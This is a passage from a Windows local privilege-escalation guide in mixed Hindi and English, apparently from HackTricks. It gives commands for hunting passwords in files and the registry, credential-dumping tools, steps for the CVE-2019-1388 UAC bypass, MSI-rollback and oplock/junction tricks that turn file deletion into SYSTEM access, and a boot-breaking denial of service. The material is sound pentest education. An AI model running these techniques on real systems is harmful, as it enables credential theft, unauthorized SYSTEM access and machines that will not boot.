इस registry के CLSIDs के अंदर आप child registry **InProcServer32** पाएँगे जो एक **default value** रखती है जो किसी **DLL** की ओर इशारा करती है और एक value **ThreadingModel** होती है जो **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) या **Neutral** (Thread Neutral) हो सकती है।

![](<../../images/image (729).png>)

सार रूप में, यदि आप किसी भी ऐसे **DLLs को overwrite कर सकें** जो execute होने वाले हैं, तो अगर वह DLL किसी अलग user द्वारा execute किया जाता है तो आप **अनुमतियाँ बढ़ा सकते हैं**।

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**फ़ाइल सामग्री के लिए खोज करें**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी निश्चित फ़ाइलनाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**registry में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools जो passwords खोजते हैं

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin मैंने बनाया है। यह plugin victim के अंदर **automatically execute every metasploit POST module that searches for credentials** को चलाने के लिए है।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically इस पेज में उल्लिखित passwords वाले सभी files खोजता है।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) system से password extract करने के लिए एक और बेहतरीन tool है।

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) उन कई tools के **sessions**, **usernames** और **passwords** खोजता है जो यह data clear text में save करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

कल्पना करें कि **SYSTEM के रूप में चल रहा एक process एक नया process खोलता है** (`OpenProcess()`) और उसे **full access** मिलता है। वही process **एक नया process भी बनाता है** (`CreateProcess()`) जो **low privileges के साथ होता है लेकिन main process के सभी open handles inherit कर लेता है**.\
यदि आपके पास **low privileged process पर full access** है, तो आप `OpenProcess()` से बनाए गए privileged process के **open handle** को पकड़कर उसमें **shellcode inject** कर सकते हैं.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, process communication और data transfer की अनुमति देते हैं।

Windows एक सुविधा प्रदान करता है जिसे **Named Pipes** कहते हैं, जो unrelated processes को भी डेटा share करने की अनुमति देता है, यहाँ तक कि अलग networks पर भी। यह client/server आर्किटेक्चर जैसा है, जिसमें रोल्स **named pipe server** और **named pipe client** होते हैं।

जब कोई **client** pipe के माध्यम से डेटा भेजता है, तो pipe सेटअप करने वाला **server** उस **client** की identity लेने (impersonate) की क्षमता रखता है, बशर्ते उसके पास आवश्यक **SeImpersonate** rights हों। किसी ऐसे **privileged process** की पहचान करना जो pipe के माध्यम से communicate करता है जिसे आप mimic कर सकते हैं, यह मौका देता है कि जब वह उस pipe के साथ interact करे जो आपने बनाया है तो आप उसकी identity अपनाकर **higher privileges प्राप्त** कर सकें। ऐसे attack को execute करने के निर्देशों के लिए मददगार गाइड [**here**](named-pipe-client-impersonation.md) और [**here**](#from-high-integrity-to-system) पर मिलते हैं।

साथ ही नीचे दिया गया tool **named pipe communication को burp जैसे tool से intercept करने** की अनुमति देता है: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह tool सभी pipes को list और देख कर privescs खोजने में मदद करता है** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## विविध

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

जब user के रूप में shell मिलता है, तो हो सकता है कि scheduled tasks या अन्य processes चल रहे हों जो **credentials को command line पर पास करते हैं**। नीचे दिया गया script हर दो सेकंड में process command lines capture करता है और वर्तमान state को पिछले state से compare कर के किसी भी difference को output करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## प्रक्रियाओं से पासवर्ड चुराना

## Low Priv User से NT\AUTHORITY SYSTEM तक (CVE-2019-1388) / UAC Bypass

यदि आपके पास graphical interface (via console या RDP) तक पहुँच है और UAC सक्षम है, तो Microsoft Windows के कुछ संस्करणों में कम-प्रिविलेज उपयोगकर्ता से "NT\AUTHORITY SYSTEM" जैसे टर्मिनल या कोई अन्य process चलाना संभव है।

यह एक ही vulnerability के साथ एक ही समय में privileges escalate करने और UAC को bypass करने की अनुमति देता है। इसके अतिरिक्त, कुछ भी install करने की जरूरत नहीं है और प्रक्रिया के दौरान उपयोग किया गया binary Microsoft द्वारा signed और issued किया गया है।

प्रभावित सिस्टमों में से कुछ निम्नलिखित हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability को exploit करने के लिए, निम्नलिखित कदम उठाने आवश्यक हैं:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Integrity Levels के बारे में जानने के लिए इसे पढ़ें:


{{#ref}}
integrity-levels.md
{{#endref}}

फिर UAC और UAC bypasses के बारे में जानने के लिए इसे पढ़ें:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

यह तकनीक मूलतः [**इस ब्लॉग पोस्ट**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) में वर्णित है और इसका exploit code [**यहाँ उपलब्ध है**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

हमला मूलतः Windows Installer के rollback फीचर का दुरुपयोग करके uninstall प्रक्रिया के दौरान वैध फाइलों को malicious फाइलों से बदलने पर आधारित है। इसके लिए attacker को एक **malicious MSI installer** बनाना होगा जो `C:\Config.Msi` फ़ोल्डर को hijack करने के लिए इस्तेमाल किया जाएगा, जिसे बाद में Windows Installer uninstall के दौरान rollback फाइलें स्टोर करने के लिए उपयोग करेगा जहाँ rollback फाइलों को malicious payload शामिल करने के लिए संशोधित किया गया होगा।

संक्षेप में तकनीक इस प्रकार है:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- एक `.msi` बनाएं जो writable फ़ोल्डर (`TARGETDIR`) में एक harmless फ़ाइल (जैसे, `dummy.txt`) install करे।
- Installer को **"UAC Compliant"** के रूप में मार्क करें, ताकि **non-admin user** इसे चला सके।
- install के बाद फ़ाइल का एक **handle** open रखें।

- Step 2: Begin Uninstall
- उसी `.msi` को uninstall करें।
- uninstall प्रक्रिया फाइलों को `C:\Config.Msi` में move करना शुरू कर देती है और उन्हें `.rbf` फाइलों के रूप में rename कर देती है (rollback backups)।
- जब फ़ाइल `C:\Config.Msi\<random>.rbf` बनती है, तो पता लगाने के लिए open file handle को `GetFinalPathNameByHandle` से **poll** करें।

- Step 3: Custom Syncing
- `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल करें जो:
- संकेत देता है जब `.rbf` लिखा गया हो।
- फिर uninstall जारी रखने से पहले किसी दूसरे event पर **wait** करता है।

- Step 4: Block Deletion of `.rbf`
- संकेत मिलने पर, `.rbf` फ़ाइल को `FILE_SHARE_DELETE` के बिना **open** करें — यह इसे delete किए जाने से **रोकता है**।
- फिर uninstall को पूरा होने देने के लिए **signal back** करें।
- Windows Installer `.rbf` को delete करने में विफल रहता है, और चूँकि यह सभी सामग्री को नहीं हटा पाता, **`C:\Config.Msi` remove नहीं होता**।

- Step 5: Manually Delete `.rbf`
- आप (attacker) `.rbf` फ़ाइल को मैन्युअली delete कर देते हैं।
- अब **`C:\Config.Msi` empty है**, hijack के लिए तैयार।

> इस बिंदु पर, `C:\Config.Msi` को delete करने के लिए **SYSTEM-level arbitrary folder delete vulnerability** को ट्रिगर करें।

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- आप स्वयं `C:\Config.Msi` फ़ोल्डर को recreate करें।
- कमजोर DACLs सेट करें (उदाहरण: Everyone:F), और `WRITE_DAC` के साथ एक handle open रखें।

- Step 7: Run Another Install
- `.msi` को फिर से install करें, जिसमें:
- `TARGETDIR`: Writable location.
- `ERROROUT`: एक variable जो forced failure को trigger करे।
- यह install फिर से **rollback** ट्रिगर करने के लिए उपयोग किया जाएगा, जो `.rbs` और `.rbf` पढ़ता है।

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW` का उपयोग करके `C:\Config.Msi` की निगरानी करें जब तक कि कोई नया `.rbs` न दिखे।
- इसकी filename कैप्चर करें।

- Step 9: Sync Before Rollback
- `.msi` में एक **custom install action (`SyncBeforeRollback`)** शामिल है जो:
- `.rbs` बनते ही एक event signal करता है।
- फिर आगे बढ़ने से पहले **wait** करता है।

- Step 10: Reapply Weak ACL
- `.rbs created` event मिलने के बाद:
- Windows Installer `C:\Config.Msi` पर **strong ACLs reapply** करता है।
- लेकिन चूँकि आपके पास अभी भी `WRITE_DAC` के साथ एक handle है, आप फिर से कमजोर ACLs **reapply** कर सकते हैं।

> ACLs केवल handle open पर लागू होते हैं, इसलिए आप अभी भी फ़ोल्डर में लिख सकते हैं।

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` फ़ाइल को एक **fake rollback script** से overwrite करें जो Windows को बताए कि:
- आपकी `.rbf` फ़ाइल (malicious DLL) को एक **privileged location** (उदाहरण: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) में restore करना है।
- आपकी fake `.rbf` छोड़ें जिसमें एक **malicious SYSTEM-level payload DLL** हो।

- Step 12: Trigger the Rollback
- sync event को signal करें ताकि installer resume हो सके।
- एक **type 19 custom action (`ErrorOut`)** को इस तरह configure किया गया है कि install एक ज्ञात बिंदु पर जानबूझकर fail हो।
- इससे **rollback शुरू** हो जाता है।

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- आपकी malicious `.rbs` पढ़ता है।
- आपके `.rbf` DLL को target स्थान में copy कर देता है।
- अब आपके पास **SYSTEM-loaded path में malicious DLL** है।

- Final Step: Execute SYSTEM Code
- किसी trusted **auto-elevated binary** (उदाहरण: `osk.exe`) को चलाएँ जो आपने hijack की हुई DLL को load करे।
- **Boom**: आपका कोड **SYSTEM के रूप में execute** होता है।


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

मुख्य MSI rollback तकनीक (पिछली) यह मानती है कि आप एक **पूरा फ़ोल्डर** delete कर सकते हैं (उदाहरण: `C:\Config.Msi`)। लेकिन अगर आपकी vulnerability केवल **arbitrary file deletion** की अनुमति देती है तो क्या होगा?

आप **NTFS internals** का शोषण कर सकते हैं: हर फ़ोल्डर के पास एक छिपा alternate data stream होता है जिसे कहा जाता है:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह स्ट्रीम फ़ोल्डर के **index metadata** को संग्रहीत करती है।

इसलिए, यदि आप किसी फ़ोल्डर की **`::$INDEX_ALLOCATION` स्ट्रीम को डिलीट कर देते हैं**, तो NTFS फ़ाइल सिस्टम से **पूरे फ़ोल्डर को हटा देता है**।

आप यह मानक फ़ाइल हटाने वाली APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप *file* delete API को कॉल कर रहे हों, यह **फ़ोल्डर ही डिलीट कर देता है**।

### फ़ोल्डर की सामग्री हटाने से SYSTEM EoP तक
अगर आपका primitive आपको arbitrary files/folders डिलीट करने की अनुमति नहीं देता, लेकिन यह **हमलावर-नियंत्रित फ़ोल्डर की *सामग्री* को डिलीट करने की अनुमति देता है** तो क्या होगा?

1. Step 1: एक चारा फ़ोल्डर और फ़ाइल सेटअप करें
- बनाएँ: `C:\temp\folder1`
- इसके अंदर: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर एक **oplock** रखें
- यह **निष्पादन को रोक देता है** जब कोई privileged process `file1.txt` को डिलीट करने की कोशिश करता है।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. चरण 3: SYSTEM प्रक्रिया ट्रिगर करें (उदा., `SilentCleanup`)
- यह प्रक्रिया फ़ोल्डरों को स्कैन करती है (उदा., `%TEMP%`) और उनकी सामग्री को हटाने की कोशिश करती है।
- जब यह `file1.txt` तक पहुँचती है, तो **oplock triggers** और नियंत्रण आपके callback को सौंप देती है।

4. चरण 4: oplock callback के अंदर – हटाने को पुनर्निर्देशित करें

- विकल्प A: `file1.txt` को कहीं और ले जाएँ
- यह `folder1` को खाली कर देता है बिना oplock तोड़े।
- `file1.txt` को सीधे हटाएँ नहीं — इससे oplock समय से पहले रिलीज़ हो जाएगा।

- विकल्प B: `folder1` को **junction** में बदलें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: `\RPC Control` में एक **symlink** बनाएं:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS internal stream को लक्षित करता है जो फ़ोल्डर मेटाडेटा संग्रहीत करता है — इसे हटाने पर फ़ोल्डर भी हट जाएगा।

5. चरण 5: oplock को रिलीज़ करें
- SYSTEM process जारी रहता है और `file1.txt` को हटाने की कोशिश करता है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में हटाया जा रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` को SYSTEM द्वारा हटा दिया जाता है।

### From Arbitrary Folder Create to Permanent DoS

एक primitive का फायदा उठाएँ जो आपको **create an arbitrary folder as SYSTEM/admin** करने की अनुमति देता है — भले ही आप **फ़ाइलें लिख न सकें** या **कमज़ोर permissions सेट न कर सकें**।

किसी **महत्वपूर्ण Windows driver** के नाम से एक **फ़ोल्डर** (फ़ाइल नहीं) बनाइए, उदाहरण के लिए:
```
C:\Windows\System32\cng.sys
```
- यह पथ सामान्यतः `cng.sys` kernel-mode ड्राइवर के अनुरूप होता है।
- यदि आप इसे **पहले से फोल्डर के रूप में बना दें**, तो Windows बूट के दौरान वास्तविक ड्राइवर लोड करने में विफल रहता है।
- फिर, Windows बूट के दौरान `cng.sys` लोड करने की कोशिश करता है।
- यह फोल्डर देखता है, **वास्तविक ड्राइवर का पता लगाने में विफल रहता है**, और **क्रैश हो जाता है या बूट रोक देता है**।
- बाहरी हस्तक्षेप (उदा., boot repair या disk access) के बिना **कोई fallback नहीं** और **कोई recovery नहीं**।

## **High Integrity से SYSTEM तक**

### **नया service**

यदि आप पहले से ही किसी High Integrity process पर चल रहे हैं, तो **SYSTEM तक रास्ता** केवल **एक नया service बनाकर और चलाकर** आसान हो सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> जब आप एक service binary बना रहे हों तो सुनिश्चित करें कि वह एक वैध service हो या binary आवश्यक क्रियाएँ तेजी से करे क्योंकि यदि वह वैध service नहीं होगा तो उसे 20s में बंद कर दिया जाएगा।

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास वे token privileges हैं (संभवतः आप इन्हें पहले से ही किसी High Integrity process में पाएँगे), तो आप SeDebug privilege के साथ लगभग किसी भी process (protected processes को छोड़कर) को **open** कर सकेंगे, उस process का **token copy** कर सकते हैं, और उस token के साथ एक **arbitrary process create** कर सकते हैं।\
इस तकनीक में आम तौर पर **SYSTEM के रूप में चल रहे किसी भी process को चुना जाता है जिसमें सभी token privileges हों** (_हाँ, आप SYSTEM processes ऐसे भी पा सकते हैं जिनमें सभी token privileges नहीं होते_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. तकनीक में **एक pipe बनाना और फिर उस pipe पर लिखने के लिए किसी service को create/abuse करना** शामिल है। फिर, वह **server** जिसने pipe बनाया है और जिसने **`SeImpersonate`** privilege का उपयोग किया है, वह pipe client (service) के token को **impersonate** कर सकता है और SYSTEM privileges प्राप्त कर सकता है।\
यदि आप [**name pipes के बारे में और सीखना चाहते हैं तो यह पढ़ें**](#named-pipe-client-impersonation)।\
यदि आप एक उदाहरण पढ़ना चाहते हैं कि [**कैसे name pipes का उपयोग कर के high integrity से System तक पहुँचा जाए**](from-high-integrity-to-system-with-name-pipes.md) तो यह पढ़ें।

### Dll Hijacking

यदि आप किसी ऐसे **dll को hijack** कर लेते हैं जो **SYSTEM** के रूप में चल रहे किसी **process** द्वारा **load** किया जा रहा हो, तो आप उन अनुमतियों के साथ arbitrary code execute कर पाएँगे। इसलिए Dll Hijacking इस प्रकार के privilege escalation के लिए उपयोगी है, और इसके अलावा, high integrity process से यह हासिल करना बहुत **आसान** होता है क्योंकि उसके पास dlls load करने के लिए उपयोग किए जाने वाले फोल्डर्स पर **write permissions** होंगे।\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## और मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## उपयोगी टूल्स

**Windows local privilege escalation vectors खोजने के लिए सर्वश्रेष्ठ टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Misconfigurations और sensitive files की जाँच करें (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). पहचाना गया।**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जाँच और जानकारी एकत्रित करना (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Misconfigurations की जाँच**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session जानकारी निकालता है। लोकल में -Thorough उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। पहचाना गया।**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- एकत्रित पासवर्ड्स को domain पर spray करना**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer और man-in-the-middle टूल है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बेसिक privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- ज्ञात privesc vulnerabilities खोजें (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- लोकल चेक्स **(Admin rights आवश्यक)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजें (VisualStudio का उपयोग करके compile करना होगा) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations की खोज करते हुए host enumerate करता है (ज्यादा एक gather info tool है न कि privesc) (compile करना होगा) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- बहुत से softwares से credentials निकालता है (github में precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# पोर्ट**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Misconfiguration की जाँच (executable github में precompiled). सलाह नहीं दी जाती। यह Win10 में अच्छे से काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जाँच (python से exe)। सलाह नहीं दी जाती। यह Win10 में अच्छे से काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool इस पोस्ट के आधार पर बनाया गया है (यह proper तरीके से काम करने के लिए accesschk की आवश्यकता नहीं है पर यह उसे उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के आउटपुट को पढ़कर काम करने वाले exploits सुझाता है (लोकल python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के आउटपुट को पढ़कर काम करने वाले exploits सुझाता है (लोकल python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको प्रोजेक्ट को सही संस्करण के .NET के साथ compile करना होगा ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). पीड़ित होस्ट पर इंस्टॉल किए गए .NET संस्करण को देखने के लिए आप कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

{{#include ../../banners/hacktricks-training.md}}
